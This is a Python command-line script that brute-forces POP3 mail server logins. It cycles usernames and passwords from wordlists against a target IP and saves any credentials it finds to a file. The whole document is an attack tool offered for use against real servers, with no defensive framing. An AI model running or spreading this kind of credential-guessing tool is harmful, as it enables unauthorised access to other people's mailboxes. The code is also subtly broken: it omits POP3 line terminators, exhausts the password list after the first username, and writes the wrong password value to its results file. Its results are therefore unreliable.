#!/usr/bin/python3
import argparse
import socket
import time

results = {}


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--ip', help='Target IP Address', type=str)
    parser.add_argument('-p', '--port', help='Target Port', default=110, type=int)
    parser.add_argument('-t', '--wait_time', help='Wait(seconds) between auth attempts', default=1, type=int)
    parser.add_argument('-u', '--username', help='Username to test', nargs='?', type=str)
    parser.add_argument('-U', '--username_wordlist', help='Username list to test', nargs='?', type=str)
    parser.add_argument('-pw', '--password', help='Password to test', nargs='?', type=str)
    parser.add_argument('-PW', '--password_wordlist', help='Password list to test', nargs='?', type=str)
    arguments = parser.parse_args()
    return arguments


def get_initial_socket(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.recv(1024)
    return s


def try_auth(ip, port, username, password, wait_time):
    global results
    _socket = get_initial_socket(ip, port)
    msg = f'USER {username}'
    _socket.send(msg.encode('utf-8'))
    user_result = _socket.recv(1024)
    msg = f'PASS {password}'
    _socket.send(msg.encode('utf-8'))
    pass_result = _socket.recv(1024)
    print(f'Username: {username}\t\t{user_result}')
    print(f'Password: {password}\t\t{pass_result}')
    _key = len(pass_result)
    if _key not in results:
        results[_key] = [1, {username: password}]
    if _key in results:
        results[_key][0] += 1
        results[_key][1][username] = password
    time.sleep(wait_time)
    _socket.close()


def test_file_path(wordlist_path):
    try:
        f_open = open(wordlist_path, 'r')
    except FileNotFoundError:
        print(f'The following wordlist could not be found:\n{wordlist_path}')
        exit(1)
    return f_open


def execute_tests(variables_dict):
    _ip = variables_dict['ip']
    _port = variables_dict['port']
    _wait_time = variables_dict['wait_time']
    _username = variables_dict['username']
    _username_wordlist = variables_dict['username_wordlist']
    _password = variables_dict['password']
    _password_wordlist = variables_dict['password_wordlist']

    _socket = get_initial_socket(_ip, _port)

    if _username and not _username_wordlist:
        if _password and not _password_wordlist:                        #username + password
            try_auth(_ip, _port, _username, _password, _wait_time)

        if _password_wordlist and not _password:                        #username + password_wordlist
            f_open = test_file_path(_password_wordlist)
            for wordlist_password in f_open:
                try_auth(_ip, _port, _username, wordlist_password, _wait_time)
            f_open.close()

    if _username_wordlist and not _username:
        if _password and not _password_wordlist:                        #username_wordlist + password
            f_open = test_file_path(_username_wordlist)
            for wordlist_username in f_open:
                try_auth(_ip, _port, wordlist_username, _password, _wait_time)
            f_open.close()

        if _password_wordlist and not _password:                        #username_wordlist + password_wordlist
            f_open0 = test_file_path(_username_wordlist)
            f_open1 = test_file_path(_password_wordlist)
            for wordlist_username in f_open0:
                for wordlist_password in f_open1:
                    try_auth(_ip, _port, wordlist_username, wordlist_password, _wait_time)
            f_open0.close()
            f_open1.close()


def fail_out(item, item_wordlist, item_identifier, item_wordlist_identifier):
    msg = f'Single {item} or a {item_wordlist} required, but not both'
    msg += f'\n-{item_identifier}\t\t{item}\n-{item_wordlist_identifier}\t\t{item_wordlist}\n'
    print(msg)
    exit(1)


def main():
    args = parse_args()
    ip = args.ip
    port = args.port
    wait_time = args.wait_time
    username = args.username
    username_wordlist = args.username_wordlist
    password = args.password
    password_wordlist = args.password_wordlist

    if not ip or ip == '' or ip == '\n':
        print('IP is a required input:\n-i <Target_IP>\t\tIP Address with Pop3 Server')
        exit(1)

    if not username and not username_wordlist:
        fail_out('username', 'username_wordlist', 'u', 'U')
    if username and username_wordlist:
        fail_out('username', 'username_wordlist', 'u', 'U')

    if not password and not password_wordlist:
        fail_out('password', 'password_wordlist', 'pw', 'PW')
    if password and password_wordlist:
        fail_out('password', 'password_wordlist', 'pw', 'PW')

    variables_dict = {
        'ip': ip,
        'port': port,
        'wait_time': wait_time,
        'username': username,
        'username_wordlist': username_wordlist,
        'password': password,
        'password_wordlist': password_wordlist,
    }

    execute_tests(variables_dict)
    global results
    ranking_list = []
    for key in results:
        ranking_list.append(key)
    final_results = results[min(ranking_list)][1]
    f_open = open(f'pop3_creds_found_{ip}', 'w')
    for username in final_results:
        f_open.write(f'{username} {password}')


if __name__ == '__main__':
    main()
